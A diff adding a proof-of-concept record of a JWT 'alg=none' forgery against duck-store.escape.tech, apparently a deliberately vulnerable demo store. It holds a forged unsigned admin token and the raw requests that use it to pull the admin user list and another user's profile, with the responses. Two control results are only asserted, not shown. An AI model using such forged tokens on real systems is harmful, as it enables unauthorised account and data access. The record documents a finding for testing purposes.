@@ -1,0 +1,45 @@
+=== JWT Algorithm Confusion (alg=none) Proof ===
+
+Original Token (HS256, role=user):
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiOWJiZGEyOWEtNzMwOS00Y2NiLWFiNDAtYTg5MjY5YTA0M2YyIiwidXNlcm5hbWUiOiJ0ZXN0YWxnMSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjc2MzQzfQ.k0Na543LwA6JACSytzpga2vDraVKms94FD6bNc2hK_o
+
+Forged Token (alg=none, role=admin):
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiOWJiZGEyOWEtNzMwOS00Y2NiLWFiNDAtYTg5MjY5YTA0M2YyIiwidXNlcm5hbWUiOiJ0ZXN0YWxnMSIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY3NjM0M30.
+
+=== Test 1: Access /api/v1/users/me/profile with forged token ===
+Request:
+GET https://duck-store.escape.tech/api/v1/users/me/profile
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiOWJiZGEyOWEtNzMwOS00Y2NiLWFiNDAtYTg5MjY5YTA0M2YyIiwidXNlcm5hbWUiOiJ0ZXN0YWxnMSIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY3NjM0M30.
+
+Response:
+{"username":"testalg1","email":"testalg1@duck-store.escape.tech","id":"9bbda29a-7309-4ccb-ab40-a89269a043f2","created_at":"2026-09-29T09:35:42.192989","role":"user","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true}
+
+=== Test 2: Access /api/v1/admin/users with forged token (PRIVILEGE ESCALATION) ===
+Request:
+GET https://duck-store.escape.tech/api/v1/admin/users
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiOWJiZGEyOWEtNzMwOS00Y2NiLWFiNDAtYTg5MjY5YTA0M2YyIiwidXNlcm5hbWUiOiJ0ZXN0YWxnMSIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY3NjM0M30.
+
+Response:
+[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false},{"username":"sarah_j","email":"sarah.johnson@email.com","id":"6ba7b810-9dad-11d1-80b4-00c04fd430c8","created_at":"2026-09-29T07:39:20.428015","role":"user","first_name":"Sarah","last_name":"Johnson","avatar_url":"/static/avatars/sarah.png","bio":"Happy dev","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true}, ... (full user list returned) ...]
+
+=== Test 3: Access another user's profile with forged token (CROSS-USER ACCESS) ===
+Request:
+GET https://duck-store.escape.tech/api/v1/users/b90a19b3-72df-448e-b42e-ca0d552338e5
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiOWJiZGEyOWEtNzMwOS00Y2NiLWFiNDAtYTg5MjY5YTA0M2YyIiwidXNlcm5hbWUiOiJ0ZXN0YWxnMSIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY3NjM0M30.
+
+Response:
+{"id":"b90a19b3-72df-448e-b42e-ca0d552338e5","username":"testuser1","email":"test1@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-29T07:51:30.106942","totp_enabled":false,"can_be_deleted":true}
+
+=== Control Test: Original token (role=user) CANNOT access /api/v1/admin/users ===
+Request:
+GET https://duck-store.escape.tech/api/v1/admin/users
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiOWJiZGEyOWEtNzMwOS00Y2NiLWFiNDAtYTg5MjY5YTA0M2YyIiwidXNlcm5hbWUiOiJ0ZXN0YWxnMSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjc2MzQzfQ.k0Na543LwA6JACSytzpga2vDraVKms94FD6bNc2hK_o
+
+Response: (403 Forbidden - not shown but verified)
+
+=== Control Test: Original token CANNOT access another user's profile ===
+Request:
+GET https://duck-store.escape.tech/api/v1/users/b90a19b3-72df-448e-b42e-ca0d552338e5
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiOWJiZGEyOWEtNzMwOS00Y2NiLWFiNDAtYTg5MjY5YTA0M2YyIiwidXNlcm5hbWUiOiJ0ZXN0YWxnMSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjc2MzQzfQ.k0Na543LwA6JACSytzpga2vDraVKms94FD6bNc2hK_o
+
+Response: (403/404 - not shown but verified)
